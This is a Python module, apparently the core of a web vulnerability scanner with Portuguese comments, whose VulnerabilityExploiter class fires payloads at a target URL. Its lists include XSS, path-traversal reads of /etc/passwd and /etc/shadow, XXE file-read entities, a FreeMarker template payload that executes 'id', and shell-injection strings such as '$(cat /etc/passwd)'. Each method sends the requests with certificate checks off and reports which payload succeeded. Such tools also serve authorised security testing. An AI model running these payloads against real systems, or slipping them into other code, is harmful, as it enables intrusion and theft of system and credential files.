# core/exploit.py
import requests
import re
import xml.etree.ElementTree as ET
from urllib.parse import urljoin, quote
import base64
import json

class VulnerabilityExploiter:
    def __init__(self):
        self.xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            'javascript:alert("XSS")',
            '<body onload=alert("XSS")>'
        ]
        
        self.lfi_payloads = [
            '../../../../etc/passwd',
            '....//....//....//....//etc/passwd',
            '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            '/proc/self/environ',
            '/etc/shadow'
        ]
        
        self.xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><root>&xxe;</root>'
        ]

    def test_xss(self, url, params=None):
        """Testa vulnerabilidade XSS"""
        print(f"[+] Testando XSS em: {url}")
        
        for payload in self.xss_payloads:
            try:
                if params:
                    # Testa em parâmetros GET
                    test_url = f"{url}?{params}={quote(payload)}"
                    response = requests.get(test_url, timeout=5, verify=False)
                else:
                    # Testa em corpo POST
                    response = requests.post(url, data={'input': payload}, timeout=5, verify=False)
                
                if payload in response.text:
                    print(f"[!] XSS VULNERÁVEL: {url} - Payload: {payload}")
                    return True
                    
            except Exception as e:
                continue
                
        return False

    def test_lfi(self, url, param):
        """Testa Local File Inclusion"""
        print(f"[+] Testando LFI em: {url}")
        
        for payload in self.lfi_payloads:
            try:
                test_url = f"{url}?{param}={quote(payload)}"
                response = requests.get(test_url, timeout=5, verify=False)
                
                # Verifica se conseguiu ler arquivo do sistema
                if any(indicator in response.text for indicator in 
                      ['root:', '[boot loader]', '<?php', '#!/bin/bash']):
                    print(f"[!] LFI VULNERÁVEL: {url} - Arquivo: {payload}")
                    return True
                    
            except Exception as e:
                continue
                
        return False

    def test_xxe(self, url):
        """Testa XML External Entity"""
        print(f"[+] Testando XXE em: {url}")
        
        for payload in self.xxe_payloads:
            try:
                headers = {'Content-Type': 'application/xml'}
                response = requests.post(url, data=payload, headers=headers, 
                                       timeout=5, verify=False)
                
                if any(indicator in response.text for indicator in 
                      ['root:', '<?php', 'boot loader', 'Administrator']):
                    print(f"[!] XXE VULNERÁVEL: {url}")
                    return True
                    
            except Exception as e:
                continue
                
        return False

    def test_ssti(self, url, param):
        """Testa Server Side Template Injection"""
        print(f"[+] Testando SSTI em: {url}")
        
        ssti_payloads = {
            'jinja2': '{{7*7}}',
            'twig': '{{7*7}}',
            'freemarker': '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }',
            'velocity': '#set($str=$class.inspect("java.lang.String").type)',
            'smarty': '{php}echo phpinfo();{/php}'
        }
        
        for engine, payload in ssti_payloads.items():
            try:
                test_url = f"{url}?{param}={quote(payload)}"
                response = requests.get(test_url, timeout=5, verify=False)
                
                if '49' in response.text or 'phpinfo' in response.text:
                    print(f"[!] SSTI VULNERÁVEL: {url} - Engine: {engine}")
                    return True
                    
            except Exception as e:
                continue
                
        return False

    def test_command_injection(self, url, param):
        """Testa Command Injection"""
        print(f"[+] Testando Command Injection em: {url}")
        
        cmd_payloads = [
            ';id',
            '&& whoami',
            '| ls -la',
            '`id`',
            '$(cat /etc/passwd)'
        ]
        
        for payload in cmd_payloads:
            try:
                test_url = f"{url}?{param}={quote(payload)}"
                response = requests.get(test_url, timeout=5, verify=False)
                
                if any(indicator in response.text for indicator in 
                      ['uid=', 'root', 'etc/passwd', 'Directory of']):
                    print(f"[!] COMMAND INJECTION: {url} - Payload: {payload}")
                    return True
                    
            except Exception as e:
                continue
                
        return False